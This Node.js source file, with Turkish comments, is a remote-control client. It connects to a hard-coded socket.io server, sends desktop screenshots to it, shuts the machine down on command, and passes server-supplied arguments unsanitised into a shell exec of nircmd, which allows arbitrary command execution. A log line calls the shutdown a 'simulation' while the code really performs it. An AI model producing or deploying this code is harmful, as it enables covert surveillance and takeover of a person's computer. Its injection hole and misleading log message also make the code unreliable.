const io = require('socket.io-client');
const screenshot = require('screenshot-desktop');
const { exec } = require('child_process');

// Bağlanmak istediğiniz sunucu adresini buraya yazın (ör: http://sunucu_ip:3000 veya http://domain.com:3000)
const SERVER_URL = '192.168.1.176:3000';
const socket = io(SERVER_URL); // Sunucu adresi

socket.on('connect', () => {
    console.log('Sunucuya bağlandı.');
});

socket.on('komut', async (komut) => {
    console.log(`Gelen komut:`, komut);

    if (komut === 'screenshot') {
        try {
            const img = await screenshot({ format: 'png' });
            socket.emit('screenshot-data', img.toString('base64'));
            console.log('Ekran görüntüsü gönderildi.');
        } catch (err) {
            console.error('Ekran görüntüsü alınamadı:', err);
        }
    }

    if (komut === 'shutdown') {
        console.log("Sistem kapatılıyor (gerçekten değil, simülasyon)");
        exec('shutdown -s -t 0');
    }

    if (typeof komut === 'object' && komut.type === 'nircmd') {
        // komut.args: kullanıcıdan gelen parametreler
        exec(`nircmd.exe ${komut.args}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`nircmd hatası: ${error}`);
            } else {
                console.log('nircmd komutu çalıştırıldı:', komut.args);
            }
        });
    }
});



